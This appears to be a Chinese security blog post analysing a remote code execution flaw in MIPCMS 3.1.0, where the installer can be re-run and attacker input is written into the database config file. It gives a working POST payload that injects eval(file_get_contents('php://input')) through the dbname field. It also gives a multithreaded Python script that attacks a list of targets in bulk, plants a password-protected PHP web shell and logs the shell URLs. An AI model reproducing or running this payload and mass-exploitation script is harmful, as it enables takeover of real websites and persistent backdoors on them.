<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>MIPCMS V3.1.0 远程写入配置文件Getshell(每日一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-03-26 01:09</div>
  <div>
    <span><a href="https://getshe11.com/tags/mipcms/">#MIPCMS</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#Getshell</a></span>
      </div>
  </div>
<div class="content">
  <h2 id="0x01-前言">0x01 前言</h2>
<p>今天翻了下CNVD，看到了一个<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">MIPCMS</a>的远程代码执行漏洞，然后就去官网下载了这个版本的源码研究了下。
看下整体的结构，用的是thinkPHP的架构，看到了install这个文件没有可以绕过<code>install.lock</code>进行重装，但是里面有一个一定要验证数据库，又要找一个SQL的注入漏洞。
想起前几天大表哥Bypass发了一篇好像是关于mipcms的漏洞，赶紧去翻了一下，又学到不少技巧，这个技巧可以用在我上次发的一篇<a href="http://getpass.cn/2018/03/06/ZZCMS8.2-any-file-deleted-to-getshell/">ZZCMS 8.2任意文件删除至Getshell</a>的文章，里面有有个getshell的操作，但是也是要数据库的验证，用上这个技巧也不需要SQL注入也可以getshell了。</p>
<h2 id="0x02-环境">0x02 环境</h2>
<p>程序源码下载：http://www.mipcms.cn/mipcms-3.1.0.zip
Web环境:Deepin Linux+Apache2+PHP5.6+MySQL（192.168.1.101）
远程数据库服务器:Windows 10 x64（192.168.1.102）</p>
<!-- raw HTML omitted -->
<h2 id="0x03-漏洞利用过程">0x03 漏洞利用过程</h2>
<ol>
<li>
<p>我们先正常安装程序
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms1.png" alt=""></p>
</li>
<li>
<p>在远程数据库服务器上面开启远程访问，然后在上面建立一个名为<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>数据库。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms2.png" alt="">
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms3.png" alt=""></p>
</li>
<li>
<p>浏览器访问：http://www.getpass.test//index.php?s=/install/Install/installPost
POST:</p>
</li>
</ol>
<pre><code>username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
</code></pre><p>记得里面的数据库对应上你远程数据库服务器的信息！
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms4.png" alt=""></p>
<p>可以看到一句把eval函数写到了配置文件里面了</p>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms6.png" alt="">
4. 执行代码，具体原理我会在后面构造poc的再详细讲解
浏览器访问：http://www.getpass.test/system/config/database.php
POST：<code>phpinfo();</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms5.png" alt=""></p>
<h2 id="0x04-框架知识补充">0x04 框架知识补充</h2>
<p>还有人可能不怎么了解这个thinkPHP的框架，我在这里简单讲解下，最好还是去官方解读下https://www.kancloud.cn/manual/thinkphp5/118003</p>
<p>首先我们现在thinkPHP的配置文件<code>/system/config/config.php</code>里面修改下面这两个为<code>true</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms10.png" alt=""></p>
<p>然后去打开网站(这个适合刚刚搭建还没开始安装)，它会自动跳转到安装的页面。做了刚才的设置后会在右下角出现一个<code>小绿帽</code>，点击就可以看到文件的加载流程。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms11.png" alt="">
这里有很多文件会预加载，我们主要看它的路由文件<code>Route.php</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms12.png" alt="">
我们可以看到，这里检查了<code>install.lock</code>文件存不存在，如果不存在就会跳转到安装的界面进行安装。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms13.png" alt=""></p>
<h2 id="0x05-漏洞代码分析过程">0x05 漏洞代码分析过程</h2>
<p><code>/app/install/controller/Install.php</code>问题出现在这个文件，它里面的就在index这里检查的<code>install.lock</code>的存在，但是在<code>installPost</code>这个方法里面却没有检查，也没有做关联，在<code>install.html</code>里面直接就跳过了，从而导致了程序重装。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms9.png" alt=""></p>
<p>下面直接按照顺序读下面的代码就行了，我都注释好了。就有两个点：</p>
<ol>
<li>一个是遍历数据库内容那里，我输出了<code>$matches</code>截图这个内容给你们好理解。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms8.png" alt=""></li>
<li>再一个是配置文件的替换，读到<code>$conf = str_replace(&quot;#{$key}#&quot;, $value, $conf);</code>这句的时候我顺便截图了一个配置的内容。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms7.png" alt=""></li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">installPost</span>(<span style="color:#a6e22e">Request</span> $request) {
                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Access-Control-Allow-Origin: *&#39;</span>);
                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Access-Control-Allow-Credentials: true&#39;</span>);
                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS&#39;</span>);
                <span style="color:#a6e22e">header</span>(<span style="color:#e6db74">&#39;Access-Control-Allow-Headers: Content-Type, Content-Range,access-token, secret-key,access-key,uid,sid,terminal,X-File-Name,Content-Disposition, Content-Description&#39;</span>);
            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Request</span><span style="color:#f92672">::</span><span style="color:#a6e22e">instance</span>()<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isPost</span>()) {<span style="color:#75715e">//判断是否有post的数据
</span><span style="color:#75715e"></span>                $dbconfig[<span style="color:#e6db74">&#39;type&#39;</span>]<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mysql&#34;</span>;<span style="color:#75715e">//定义数据库类型
</span><span style="color:#75715e"></span>                $dbconfig[<span style="color:#e6db74">&#39;hostname&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.dbhost&#39;</span>);<span style="color:#75715e">//接受post过来的dbhost的值，然后赋值到$dbconfig的数组里面，下面以此类推
</span><span style="color:#75715e"></span>                $dbconfig[<span style="color:#e6db74">&#39;username&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.dbuser&#39;</span>);
                $dbconfig[<span style="color:#e6db74">&#39;password&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.dbpw&#39;</span>);
                $dbconfig[<span style="color:#e6db74">&#39;hostport&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.dbport&#39;</span>);
                $dbname<span style="color:#f92672">=</span><span style="color:#a6e22e">strtolower</span>(<span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.dbname&#39;</span>));<span style="color:#75715e">//这里用了转换小写的函数，所以后面构造poc的时候就不能直接写入一句话木马$_POST了
</span><span style="color:#75715e"></span>                
                $username <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.username&#39;</span>);
                $password <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.password&#39;</span>);
                $rpassword <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;post.rpassword&#39;</span>);
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$username) {<span style="color:#75715e">//判断上面是否有post这个值过来，没有就执行下面的报错，后面的以此类推
</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;请输入用户名&#39;</span>);
                }
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$password) {
                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;请输入密码&#39;</span>);
                }
                <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$rpassword) {
                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;请输入重复密码&#39;</span>);
                }
                <span style="color:#75715e">//下面这句是构造PDO的连接方式，如果有不懂的同学可以去了解下，因为这种方式比老的sql执行方式安全
</span><span style="color:#75715e"></span>                $dsn <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mysql:dbname=</span><span style="color:#e6db74">{</span>$dbname<span style="color:#e6db74">}</span><span style="color:#e6db74">;host=</span><span style="color:#e6db74">{</span>$dbconfig[<span style="color:#e6db74">&#39;hostname&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">;port=</span><span style="color:#e6db74">{</span>$dbconfig[<span style="color:#e6db74">&#39;hostport&#39;</span>]<span style="color:#e6db74">}</span><span style="color:#e6db74">;charset=utf8&#34;</span>;
                <span style="color:#66d9ef">try</span> {<span style="color:#75715e">//如果有学过Python的同学可以晓得try的方式可以自定义报错信息，可以避免泄露其他的敏感数据库信息
</span><span style="color:#75715e"></span>                    $db <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">\PDO</span>($dsn, $dbconfig[<span style="color:#e6db74">&#39;username&#39;</span>], $dbconfig[<span style="color:#e6db74">&#39;password&#39;</span>]);
                } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">\PDOException</span> $e) {
                    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;错误代码:&#39;</span><span style="color:#f92672">.</span>$e<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">getMessage</span>());
                }
                $dbconfig[<span style="color:#e6db74">&#39;database&#39;</span>] <span style="color:#f92672">=</span> $dbname;<span style="color:#75715e">//把上面post过来的数据库名赋值到数组
</span><span style="color:#75715e"></span>                $dbconfig[<span style="color:#e6db74">&#39;prefix&#39;</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">trim</span>(<span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#39;dbprefix&#39;</span>));<span style="color:#75715e">//接受post过来的数据前缀，然后用trim去掉两边的空白字符
</span><span style="color:#75715e"></span>                $tablepre <span style="color:#f92672">=</span> <span style="color:#a6e22e">input</span>(<span style="color:#e6db74">&#34;dbprefix&#34;</span>);<span style="color:#75715e">//表名前缀
</span><span style="color:#75715e"></span>                $sql <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">PUBLIC_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;package&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">DS</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;mipcms_v_3_1_0.sql&#39;</span>);<span style="color:#75715e">//读取数据库文件mipcms_v_3_1_0.sql的内容
</span><span style="color:#75715e"></span>                $sql <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, $sql);<span style="color:#75715e">//把刚读到的内容进行替换操作，&#34;\r&#34;是换行符，&#34;\n&#34;是回车符
</span><span style="color:#75715e"></span>                $sql <span style="color:#f92672">=</span> <span style="color:#a6e22e">explode</span>(<span style="color:#e6db74">&#34;;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, $sql);<span style="color:#75715e">//用explode函数以\n区别然后转换为数组形式
</span><span style="color:#75715e"></span>                $default_tablepre <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;mip_&#34;</span>;<span style="color:#75715e">//定义默认的表名前缀
</span><span style="color:#75715e"></span>                $sql <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34; `</span><span style="color:#e6db74">{</span>$default_tablepre<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34; `</span><span style="color:#e6db74">{</span>$tablepre<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, $sql);<span style="color:#75715e">//把上面传来的表名前缀替换掉默认的表名前缀
</span><span style="color:#75715e"></span>                <span style="color:#66d9ef">foreach</span> ($sql <span style="color:#66d9ef">as</span> $item) {<span style="color:#75715e">//这里有个遍历数组，就是把刚才的数组遍历然后一句一句执行
</span><span style="color:#75715e"></span>                    $item <span style="color:#f92672">=</span> <span style="color:#a6e22e">trim</span>($item);
                    <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($item)) <span style="color:#66d9ef">continue</span>;
                    <span style="color:#75715e">//这里有个正则匹配，正则总会把对新手弄得云里雾里，其实也不难，这里的意思就是匹配到创建表的语句先执行，然后再执行下面的，要不然会出现错误.
</span><span style="color:#75715e"></span>                    <span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/CREATE TABLE `([^ ]*)`/&#39;</span>, $item, $matches);
                    <span style="color:#66d9ef">if</span>($matches) {<span style="color:#75715e">//如果匹配到创建数据表的语句就执行，如果匹配到然后下面的执行不成功就会终止提示安装失败
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">false</span> <span style="color:#f92672">!==</span> $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exec</span>($item)){

                        } <span style="color:#66d9ef">else</span> {
                           <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;安装失败&#39;</span>);
                        }
                    } <span style="color:#66d9ef">else</span> {
                        $db<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">exec</span>($item);
                    }
                }
                
                
                <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($dbconfig)){<span style="color:#75715e">//判断是否为数组
</span><span style="color:#75715e"></span>                    $conf <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#a6e22e">PUBLIC_PATH</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;package&#39;</span><span style="color:#f92672">.</span><span style="color:#a6e22e">DS</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#39;database.php&#39;</span>);<span style="color:#75715e">//读取package文件夹下面的database.php文件
</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">foreach</span> ($dbconfig <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value) {
                        $conf <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;#</span><span style="color:#e6db74">{</span>$key<span style="color:#e6db74">}</span><span style="color:#e6db74">#&#34;</span>, $value, $conf);<span style="color:#75715e">//把刚才读到的内容里面替换掉指定数组键的值，为什么要有#，可以去看刚才文件就可以看到了
</span><span style="color:#75715e"></span>                    }
                    $install <span style="color:#f92672">=</span> <span style="color:#a6e22e">CONF_PATH</span>;<span style="color:#75715e">//把环境常量的conf路径赋值
</span><span style="color:#75715e"></span>                    <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">is_writable</span>($install)){<span style="color:#75715e">//判断这个目录是否有写入的权限
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;路径：&#39;</span><span style="color:#f92672">.</span>$install<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;没有写入权限&#39;</span>);
                    }
                    <span style="color:#66d9ef">try</span> {
                        $fileStatus <span style="color:#f92672">=</span> <span style="color:#a6e22e">is_file</span>(<span style="color:#a6e22e">CONF_PATH</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/database.php&#39;</span>);<span style="color:#75715e">//判读这个目录下的database.php是否存在
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">if</span> ($fileStatus) {
                             <span style="color:#a6e22e">unlink</span>(<span style="color:#a6e22e">CONF_PATH</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/database.php&#39;</span>);<span style="color:#75715e">//如果存在就删除这个文件
</span><span style="color:#75715e"></span>                        }
                        <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#a6e22e">CONF_PATH</span><span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/database.php&#39;</span>, $conf);<span style="color:#75715e">//然后重新再写如我们刚才替换的新的数据库文件
</span><span style="color:#75715e"></span>                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonSuccess</span>(<span style="color:#e6db74">&#39;配置文件写入成功&#39;</span>,<span style="color:#ae81ff">1</span>);
                    } <span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e) {
                        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">jsonError</span>(<span style="color:#e6db74">&#39;database.php文件写入失败，请检查system/config 文件夹是否可写入&#39;</span>);
                    }
                    
                }

        }

    }
</code></pre></div><h2 id="0x06-payload构造">0x06 Payload构造</h2>
<ol>
<li>从上面的代码分析下来，我们可以晓得，必须要传入的值有
<code>username password rpassword dbport dbname dbhost dbuser dbpw</code>
用户名密码这些可以随便写，但是数据库这个在你不晓得数据库信息的时候是无法进行下去的，因为通过上面的代码分析，如果数据库连接不成功就会退出。
看Bypass大表哥的方法，我一想，特么gb，我咋没想到这种方法呢，wocao。<code>dbhost</code>不是可以填服务器地址么，我们在一个服务器上面搭建一个然后进行连接不就行了么，哈哈哈。</li>
<li>数据库的问题解决了，我们要怎么样写到数据库文件里面呢。写到里面的就有这几个值，数据库的服务器地址和用户名密码是不能动的了，因为Mysql用户默认是16位，可以修改位数，但是数据库会把<code>,</code>自动转换为<code>.</code>，数据库密码是加密的，还有<code>prefix</code>这个参数修改了会造成创建表的出现错误导致程序不能正常执行。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms14.png" alt=""></li>
</ol>
<p>那么我们构造的写进去的信息就不能破坏里面的结构，我们就只能用<code>dbname</code>了。
3. 还有一个问题，如果我们直接构造一句话木马也不行，因为上面<code> $dbname=strtolower(input('post.dbname'))</code>这里用了转换小写，所以一句话的<code>$_POST</code>和<code>$_GET</code>就不能用了，不能用这个我们还可以用PHP的协议<code>php://input</code>来接受值然后用eval和assert来执行。
我在这里就不再讲解这个协议了，论坛有一篇文章是专门讲这个的，还挺详细的：https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=27441</p>
<ol start="4">
<li>从上面代码分析，我们可以看出，替换值后面会加上<code>',</code>，所以我们要对应上去
<code>test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'</code>
<strong>最终的Payload：</strong></li>
</ol>
<pre><code>username=admin&amp;password=admin&amp;rpassword=admin&amp;dbport=3306&amp;dbname=test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'&amp;dbhost=192.168.1.102&amp;dbuser=root&amp;dbpw=root
</code></pre><h2 id="0x07-用python编写批量getshell脚本">0x07 用Python编写批量getshell脚本</h2>
<p>我把配置都写在里面了，需要修改数据库信息直接在代码里面改了，如果加在参数会比较麻烦。</p>
<pre><code>#!/usr/bin/env
#author:F0rmat
import sys
import requests
import threading
def exploit(target):
    dbhost='192.168.1.102'
    dbuser = 'root'
    dbpw = 'root'
    dbport=3306
    dbname=&quot;test',1=&gt;eval(file_get_contents('php://input')),'2'=&gt;'&quot;
    if sys.argv[1]== &quot;-f&quot;:
        target=target[0]
    url1=target+&quot;/index.php?s=/install/Install/installPost&quot;
    data={
        &quot;username&quot;: &quot;admin&quot;,
        &quot;password&quot;:  &quot;admin&quot;,
        &quot;rpassword&quot;: &quot;admin&quot;,
        &quot;dbport&quot;: dbport,
        &quot;dbname&quot;: dbname,
        &quot;dbhost&quot;: dbhost,
        &quot;dbuser&quot;: dbuser,
        &quot;dbpw&quot;: dbpw,
    }
    payload = &quot;fwrite(fopen('shell.php','w'),'&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat');&quot;
    url2=target+&quot;/system/config/database.php&quot;
    shell = target+'/system/config/shell.php'
    try:
        requests.post(url1,data=data).content
        requests.post(url2, data=payload)
        verify = requests.get(shell, timeout=3)
        if &quot;f0rmat&quot; in verify.content:
            print 'Write success,shell url:',shell,'pass:f0rmat'
            with open(&quot;success.txt&quot;,&quot;a+&quot;) as f:
                f.write(shell+'  pass:f0rmat'+&quot;\n&quot;)
        else:
            print target,'Write failure!'
    except Exception, e:
        print e
def main():
    if len(sys.argv)&lt;3:
        print 'python mipcms_3.1.0.py -h target/-f target-file '
    else:
        if sys.argv[1] == &quot;-h&quot;:
            exploit(sys.argv[2])
        elif sys.argv[1] == &quot;-f&quot;:
            with open(sys.argv[2], &quot;r&quot;) as f:
                b = f.readlines()
                for i in xrange(len(b)):
                    if not b[i] == &quot;\n&quot;:
                        threading.Thread(target=exploit, args=(b[i].split(),)).start()



if __name__ == '__main__':
    main()
</code></pre><p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/mipcms15.png" alt=""></p>
<h2 id="0x08-结束">0x08 结束</h2>
<p>终于写完了，肚子好饿啊！
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010117.jpg" alt=""></p>
<p>我去敷面膜了，然后洗洗睡了～
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/WeChat%20Image_20180326010134.jpg" alt=""></p>
<h2 id="0x09-参考">0x09 参考</h2>
<p><a href="https://github.com/F0r3at/Python-Tools/tree/master/Mipcms">https://github.com/F0r3at/Python-Tools/tree/master/Mipcms</a>
<a href="http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516">http://www.cnvd.org.cn/flaw/show/CNVD-2018-02516</a>
<a href="http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd">http://mp.weixin.qq.com/s?__biz=MzA3NzE2MjgwMg==&amp;mid=301419963&amp;idx=1&amp;sn=0cb82aa5629b6432415c93d9f2b8eb8c&amp;chksm=0b55dde63c2254f04399a7afa7f49a3889e8eaa37d747ec1a1b70f00cc0bf94c764db1295a11&amp;mpshare=1&amp;scene=23&amp;srcid=0321pbJgBla01aN1U5GZXNlG#rd</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x01-%e5%89%8d%e8%a8%80">
                            0x01 前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x02-%e7%8e%af%e5%a2%83">
                            0x02 环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x03-%e6%bc%8f%e6%b4%9e%e5%88%a9%e7%94%a8%e8%bf%87%e7%a8%8b">
                            0x03 漏洞利用过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x04-%e6%a1%86%e6%9e%b6%e7%9f%a5%e8%af%86%e8%a1%a5%e5%85%85">
                            0x04 框架知识补充
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x05-%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            0x05 漏洞代码分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x06-payload%e6%9e%84%e9%80%a0">
                            0x06 Payload构造
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x07-%e7%94%a8python%e7%bc%96%e5%86%99%e6%89%b9%e9%87%8fgetshell%e8%84%9a%e6%9c%ac">
                            0x07 用Python编写批量getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x08-%e7%bb%93%e6%9d%9f">
                            0x08 结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#0x09-%e5%8f%82%e8%80%83">
                            0x09 参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
